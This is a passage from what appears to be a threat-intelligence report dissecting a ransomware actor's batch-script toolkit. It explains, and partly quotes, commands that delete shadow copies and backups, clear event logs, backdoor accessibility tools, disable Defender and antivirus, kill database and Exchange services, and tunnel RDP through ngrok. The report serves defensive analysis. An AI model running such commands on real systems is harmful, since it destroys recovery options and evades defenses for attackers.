<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37144" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_013.png" alt="" width="2280" height="634" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_013.png 2280w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_013-300x83.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_013-1024x285.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_013-768x214.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_013-1536x427.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_013-2048x569.png 2048w" sizes="(max-width: 2280px) 100vw, 2280px" /></a></p>





<p>These commands are intended to prevent data recovery, delete the volume shadow copies, and configure system boot settings, all making it more difficult to restore.</p>



<p>[W]badmin is a command-line utility for Windows backup and restore. The DELETE SYSTEMSTATEBACKUP arguments are used to delete system state backups. The flag-keepVersions:0 specifies that no versions of the system state backups should be kept, essentially deleting all existing system state backups. Next, the script runs wbadmin again. Similar to the previous command, this one is for deleting regular backups (not just system state backups).</p>



<p>[W]mic is another command-line utility used to interact with Windows Management Instrumentation (WMI) that can be used to delete volume shadow copies</p>



<p>The vssadmin command is used for the deletion of a specified volume&#8217;s shadow copies. In this case, it uses the &#8220;/All&#8217; parameter which deletes all shadow copies on the system. Shadow copies are used by Windows for backups and system restores. At the end the tool is used again to confirm shadow deletion.</p>



<p>[B]cdedit.exe is then used to disable WINDOWS automatic recovery features by modifying boot configuration data.</p>



<h3 id="c03" class="wp-block-heading"><strong>clearlog.bat</strong></h3>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37145" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_014.png" alt="" width="1996" height="1266" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_014.png 1996w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_014-300x190.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_014-1024x649.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_014-768x487.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_014-1536x974.png 1536w" sizes="(max-width: 1996px) 100vw, 1996px" /></a></p>





<p>This batch script checks if the user has administrative privileges and clears event logs in Windows. The IT community commonly uses portions of these commands, as seen in these posts in several IT forums many years ago.</p>



<ul class="wp-block-list">
<li><a href="https://answers.microsoft.com/en-us/windows/forum/all/clear-all-administratative-event-logs-in-event/17c5fba6-dc5e-4acd-9db0-e20665ce3ad5" target="_blank" rel="noreferrer noopener">https://answers.microsoft.com/en-us/windows/forum/all/clear-all-administratative-event-logs-in-event/17c5fba6-dc5e-4acd-9db0-e20665ce3ad5</a></li>



<li><a href="https://www.get-itsolutions.com/commands-clean-recycle-bin/" target="_blank" rel="noreferrer noopener">https://www.get-itsolutions.com/commands-clean-recycle-bin/</a></li>
</ul>



<p>Let&#8217;s break down each phase of the codes and discuss the functionalities of it.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37146" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_015.png" alt="" width="1599" height="212" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_015.png 1599w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_015-300x40.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_015-1024x136.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_015-768x102.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_015-1536x204.png 1536w" sizes="(max-width: 1599px) 100vw, 1599px" /></a></p>





<ul class="wp-block-list">
<li>The @echo off command line hides the command execution output from the console itself while setting a timer for 60 seconds using the timeout /T 60</li>



<li>FOR /F &#8220;tokens=1,2*&#8221; %%V IN (&#8216;bcdedit&#8217;) DO SET adminTest=%%V is a loop that iterates through the output of <em>bcdedit</em> command that shows boot configuration data and searches for lines containing:</li>



<li>IF (%adminTest%)==(Access) goto noAdmin, this conditional statement checks if the admintest variable is equal to &#8220;Access&#8221;. If it is, the execution jumps to the noAdmin label, effectively skipping the log-clearing process.</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37147" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_016.png" alt="" width="1673" height="65" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_016.png 1673w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_016-300x12.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_016-1024x40.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_016-768x30.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_016-1536x60.png 1536w" sizes="(max-width: 1673px) 100vw, 1673px" /></a></p>





<ul class="wp-block-list">
<li>This command has a loop that iterates through the output of wevtutil.exe el command, which lists event logs and, for each line, calls the :do_clear subroutine with the line&#8217;s content as an argument.</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37148" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_017.png" alt="" width="746" height="96" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_017.png 746w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_017-300x39.png 300w" sizes="(max-width: 746px) 100vw, 746px" /></a></p>





<ul class="wp-block-list">
<li>The line echo clearing%1 prints a message indicating which event log is being cleared. The %1 placeholder is replaced by the actual log name passed from the main loop.</li>



<li>[W]evtutil.exe cl %1 clears the specific event log identified by the %1 argument.</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37149" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_018.png" alt="" width="938" height="65" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_018.png 938w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_018-300x21.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_018-768x53.png 768w" sizes="(max-width: 938px) 100vw, 938px" /></a></p>





<ul class="wp-block-list">
<li>This line of command clears out the $Recycle.bin directory from the system partition.</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37150" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_019.png" alt="" width="1996" height="159" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_019.png 1996w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_019-300x24.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_019-1024x82.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_019-768x61.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_019-1536x122.png 1536w" sizes="(max-width: 1996px) 100vw, 1996px" /></a></p>





<p>The above commands are used to delete the Remote Desktop Protocol traces found on the host artifacts. During our usual analysis, these are the artifacts that are commonly left by the threat actor for us to identify the RDP related activities as part of their lateral movement.</p>



<ul class="wp-block-list">
<li>These commands attempt to delete registry keys related to remote desktop settings under the current user&#8217;s profile, where the following options were used:</li>



<li>/va: Deletes all values associated with the key</li>



<li>/f: Forces the deletion, even if the key is protected</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37151" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_020.png" alt="" width="735" height="167" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_020.png 735w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_020-300x68.png 300w" sizes="(max-width: 735px) 100vw, 735px" /></a></p>





<ul class="wp-block-list">
<li><em>cd %userprofile%\documents\ </em>this command will perform a change directory to the documents folder using the user profile where <em>default.rdp</em> is commonly stored. <em>Default.rdp</em> typically stores the settings for the RDP connections.. As <em>default.rdp</em> is a hidden file that is stored for each user, attrib <em>Default.rdp -s -h</em> needs to run (<em>&#8220;-s&#8221; </em>removes the &#8220;System&#8221; attribute from the file while &#8220;-h&#8221; removing the &#8220;hidden&#8221; attribute) for it to become visible. Once visible, the command del <em>Default.rdp </em>will execute the deletion of the file as part of the threat actor&#8217;s deletion of RDP traces.</li>
</ul>



<h3 id="c04" class="wp-block-heading"><strong>cmd.cmd</strong></h3>



<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37152" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_021.png" alt="" width="3450" height="1250" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_021.png 3450w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_021-300x109.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_021-1024x371.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_021-768x278.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_021-1536x557.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_021-2048x742.png 2048w" sizes="(max-width: 3450px) 100vw, 3450px" /></a></p>



<p>The script above describes itself with its comments. The script is meant to disable User Account Control (UAC), backdoor the Sticky Keys, Utilman, and other accessibility features with <strong>cmd.exe</strong>, and disable <a href="https://www.elastic.co/guide/en/security/current/network-level-authentication-nla-disabled.html" target="_blank" rel="noreferrer noopener">Network Level Authentication (NLA)</a>.</p>



<p>Running this script would allow the threat actor to access the Windows sign-in screen without authentication and run commands using the backdoor accessibility tools in the system context.</p>



<h3 id="c05" class="wp-block-heading"><strong>def1.bat</strong></h3>



<p>The following batch script is another defense evasion script that provides several commands to disable Windows Defender.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37153" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_022.png" alt="" width="1277" height="993" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_022.png 1277w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_022-300x233.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_022-1024x796.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_022-768x597.png 768w" sizes="(max-width: 1277px) 100vw, 1277px" /></a></p>





<ol class="wp-block-list">
<li>The first part of this script adds a dozen registry keys to disable several components of Windows Defender including Real-Time Protection, SpyNet, and MpEngine.</li>



<li>The second section of the script tries to disable registry keys related to ETW tracing and logging.</li>



<li>The third section disables multiple scheduled tasks related to Windows Defender.</li>



<li>In the fourth area, the script works to remove various GUI access for Windows defender, particularly the system tray icon and the context menu access for things like on demand scanning.</li>



<li>The fifth part of this script is using PowerShell to add the whole volumes (C:\, D:\, E:\, and F:\) as an <a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-extension-file-exclusions-microsoft-defender-antivirus?view=o365-worldwide" target="_blank" rel="noreferrer noopener">exclusion path</a> for Defender.</li>



<li>The sixth part then sets registry values to disable various Windows Defender services.</li>
</ol>



<h3 id="c06" class="wp-block-heading"><strong>defendermalwar.bat</strong></h3>



<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37154" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_023.png" alt="" width="2950" height="1352" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_023.png 2950w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_023-300x137.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_023-1024x469.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_023-768x352.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_023-1536x704.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_023-2048x939.png 2048w" sizes="(max-width: 2950px) 100vw, 2950px" /></a></p>



<p>This batch script executes several commands designed to disable various Windows Defender registry keys and alter User Account Control settings. WMIC command was also used in the last part of the script to uninstall Malwarebytes.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37155" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_024.png" alt="" width="2801" height="153" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_024.png 2801w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_024-300x16.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_024-1024x56.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_024-768x42.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_024-1536x84.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_024-2048x112.png 2048w" sizes="(max-width: 2801px) 100vw, 2801px" /></a></figure>



<p>The commands above were used to modify the registry key settings related to UAC on a Windows system. Let&#8217;s dissect each one of these:</p>



<ul class="wp-block-list">
<li>PromptOnSecureDesktop, setting this value to 0 disables the secure desktop when UAC prompts appear. Disabling this feature means UAC prompts will appear on the user&#8217;s current desktop, which could be less secure as some malware might interact with or spoof the UAC prompt.</li>



<li>EnableLUA, setting this value to 1 enables Limited User Account (LUA) capabilities, the underlying technology for UAC.</li>



<li>ConsentPromptBehaviorAdmin, setting this to 0 modifies the behavior of UAC prompts for administrative users. In this mode, when actions requiring administrative privileges are performed, the UAC prompt will not ask for consent (or credentials on standard user accounts)</li>
</ul>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37156" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_025.png" alt="" width="2945" height="623" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_025.png 2945w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_025-300x63.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_025-1024x217.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_025-768x162.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_025-1536x325.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_025-2048x433.png 2048w" sizes="(max-width: 2945px) 100vw, 2945px" /></a></figure>



<p>These commands collectively disable various Windows Defender security settings, including real-time protection and behavior monitoring.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37157" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_026.png" alt="" width="1623" height="159" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_026.png 1623w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_026-300x29.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_026-1024x100.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_026-768x75.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_026-1536x150.png 1536w" sizes="(max-width: 1623px) 100vw, 1623px" /></a></figure>



<p>These PowerShell commands remove the Windows Defender feature, forcefully restart the Windows Defender service, and forcefully restart the Windows Firewall service.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37158" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_027.png" alt="" width="1850" height="110" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_027.png 1850w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_027-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_027-1024x61.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_027-768x46.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_027-1536x91.png 1536w" sizes="(max-width: 1850px) 100vw, 1850px" /></a></figure>



<p>The last part of the commands contain wmic (Windows Management Instrumentation Commandline) to silently uninstall any products whose names contain &#8216;Malwarebytes&#8217;.</p>



<h3 id="c07" class="wp-block-heading"><strong>delbackup.bat</strong></h3>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37159" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_028.png" alt="" width="1924" height="1314" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_028.png 1924w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_028-300x205.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_028-1024x699.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_028-768x525.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_028-1536x1049.png 1536w" sizes="(max-width: 1924px) 100vw, 1924px" /></a></p>





<p>Just like the other script (backup.bat), it primarily focuses on removing backup and system restore points from a Windows system, disabling recovery options, and modifying the boot configuration to ignore failures. It uses command-line utilities like wbadmin, wmic, vssadmin, and bcdedit to delete existing backups, shadow copies, and system state backups, and then alters the system&#8217;s boot settings to prevent automatic recovery actions in case of errors. Lines one through seven repeat the same actions observed in the prior discussed script.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37160" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_029.png" alt="" width="1915" height="379" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_029.png 1915w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_029-300x59.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_029-1024x203.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_029-768x152.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_029-1536x304.png 1536w" sizes="(max-width: 1915px) 100vw, 1915px" /></a></figure>



<ul class="wp-block-list">
<li>cmd.exe /C wbadmin STOP job: Stops any backup jobs currently running.</li>



<li>cmd.exe /C wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0 -quiet: Deletes all the backups of system files and settings without leaving any copies.</li>



<li>cmd.exe /C wbadmin DELETE CATALOG -quiet: Removes the record of all backups so the system no longer knows they existed.</li>



<li>cmd.exe /C wbadmin DISABLE backup: Turns off the backup schedule, so no more automatic backups will be made.</li>



<li>cmd.exe /C bcdedit /set {default} recoveryenabled No and cmd.exe /C bcdedit /set {default} bootstatuspolicy ignoreallfailures: These commands make the computer ignore errors during startup and stop trying to fix them automatically.</li>
</ul>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37161" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_030.png" alt="" width="983" height="435" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_030.png 983w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_030-300x133.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_030-768x340.png 768w" sizes="(max-width: 983px) 100vw, 983px" /></a></figure>



<p>The last part of the script automates the deletion of all shadow copies (backup snapshots) on a Windows system and then removes itself. First, it changes the directory to the one containing the script, then, creates and executes a command sequence through diskshadow, to delete the shadow copies; and finally, deletes the command file and the script itself, after pausing for user input.</p>



<h3 id="c08" class="wp-block-heading"><strong>disable.bat</strong></h3>



<p>This batch script contains 398 lines of code and can kill processes and disable multiple services including web servers, databases, and exchange services. Examples of commands used are:</p>



<pre class="wp-block-preformatted">net stop MSExchangeDelivery
sc config MSExchangeDelivery start= disabled
net stop MSExchangeDiagnostics
sc config MSExchangeDiagnostics start= disabled
net stop MSExchangeEdgeSync
taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
</pre>



<p>The script also deletes many AV services, including Trend Micro, ESET, and Kaspersky:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37162" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_031.png" alt="" width="944" height="1730" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_031.png 944w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_031-164x300.png 164w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_031-559x1024.png 559w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_031-768x1407.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_031-838x1536.png 838w" sizes="(max-width: 944px) 100vw, 944px" /></a></figure>



<p>Its noteworthy that the threat actor mistyped Delete (<strong>Delite</strong>) multiple times in the script comments, this could indicate that English may be a second language for this threat actor.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37163" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_032.png" alt="" width="388" height="155" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_032.png 388w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_032-300x120.png 300w" sizes="(max-width: 388px) 100vw, 388px" /></a></figure>



<p>An additional capability of this script, its disabling and deleting of Volume Shadow Copies (vssadmin.exe Delete Shadows /All /Quiet), suggests that it is meant to be used during ransomware attacks, to accelerate the encryption and prevent the victim from recovering the files. Similar scripts have been reported in a number of our ransomware reports.</p>



<h3 id="c09" class="wp-block-heading"><strong>hyp.bat</strong></h3>



<p>The name of this batch script suggests it is a Hyper-V-related tool. The script has more than 100 lines and starts with the following commands to delete Hyper-V services:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37164" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_033.png" alt="" width="772" height="686" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_033.png 772w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_033-300x267.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_033-768x682.png 768w" sizes="(max-width: 772px) 100vw, 772px" /></a></figure>



<p>The script also deletes two services related to FireBird:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37165" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_034.png" alt="" width="1060" height="180" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_034.png 1060w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_034-300x51.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_034-1024x174.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_034-768x130.png 768w" sizes="(max-width: 1060px) 100vw, 1060px" /></a></figure>



<p><a href="https://firebirdsql.org/" target="_blank" rel="noreferrer noopener">Firebird</a> is an open-source SQL relational database system that offers high performance, scalability, and robust features.</p>



<p>The rest of the script overlaps with the files we&#8217;ve previously analyzed in this report, disabling different database services and killing their processes.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_035.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37166" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_035.png" alt="" width="1096" height="888" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_035.png 1096w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_035-300x243.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_035-1024x830.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_035-768x622.png 768w" sizes="(max-width: 1096px) 100vw, 1096px" /></a></figure>
<p>&nbsp;</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37167" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_036.png" alt="" width="1180" height="1696" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_036.png 1180w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_036-209x300.png 209w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_036-712x1024.png 712w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_036-768x1104.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_036-1069x1536.png 1069w" sizes="(max-width: 1180px) 100vw, 1180px" /></a></figure>
<p>&nbsp;</p>



<h3 id="c10" class="wp-block-heading"><strong>LOGOFALL.bat</strong></h3>



<p>This script is one of the shortest scripts in the threat actor&#8217;s toolkit. It has a straightforward functionality:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37168" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_037.png" alt="" width="2010" height="226" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_037.png 2010w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_037-300x34.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_037-1024x115.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_037-768x86.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_037-1536x173.png 1536w" sizes="(max-width: 2010px) 100vw, 2010px" /></a></figure>



<p>The query session command queries the current sessions on the system and saves the results to a text file. The batch script then iterates over the text files skipping the first line and extracting the session IDs from the 3 token (column). The sessions are then logged off using the session IDs obtained, and the text file is deleted.</p>



<h3 id="c11" class="wp-block-heading"><strong>LOGOFALL1.bat</strong></h3>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37169" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_038.png" alt="" width="3052" height="382" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_038.png 3052w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_038-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_038-1024x128.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_038-768x96.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_038-1536x192.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_038-2048x256.png 2048w" sizes="(max-width: 3052px) 100vw, 3052px" /></a></figure>



<p>This script is similar to LOGOFALL1.bat and serves the same objectives. This enhanced version logs off the users or sessions that didn&#8217;t meet the current condition only.</p>



<p>if /i &#8220;%%b&#8221;==&#8221;%username%&#8221; checks if the second token (session name) is equal to the current username (%username%). If the session name matches the current user, the session ID (%%c) is stored in the variable curID.</p>



<p>This following line for /L %%C in (0,1,20) do if &#8220;%%C&#8221; neq &#8220;%curID%&#8221; logoff %%C initiates a for /L loop that iterates from 0 to 20. For each value of %%C, it checks if the value does not equal to the current session ID stored in %curID%. If the session ID doesn&#8217;t match the current session ID, it logs off the session with the ID %%C.</p>



<h3 id="c12" class="wp-block-heading"><strong>NG1.bat</strong></h3>



<p>This batch script contained three lines of <a href="https://ngrok.com/docs/agent/cli/" target="_blank" rel="noreferrer noopener">ngrok</a> configuration:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37170" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_039.png" alt="" width="2506" height="238" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_039.png 2506w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_039-300x28.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_039-1024x97.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_039-768x73.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_039-1536x146.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_039-2048x195.png 2048w" sizes="(max-width: 2506px) 100vw, 2506px" /></a></figure>



<p>The ngrok config add-authtoken command saves the ngrok authtoken to the configuration file. While ngrok tcp can be used to start a TCP tunnel, which forwards all traffic on a public port to a local server (RDP in this case), it is also  extremely useful for exposing services that run non-HTTP traffic (SSH, SIP, RDP, RTSP, GRPC, game servers, etc).</p>



<h3 id="c13" class="wp-block-heading"><strong>NG2.bat</strong></h3>



<p>This script is similar to the first ngrok script NG1.bat. Only the authentication token differs:</p>



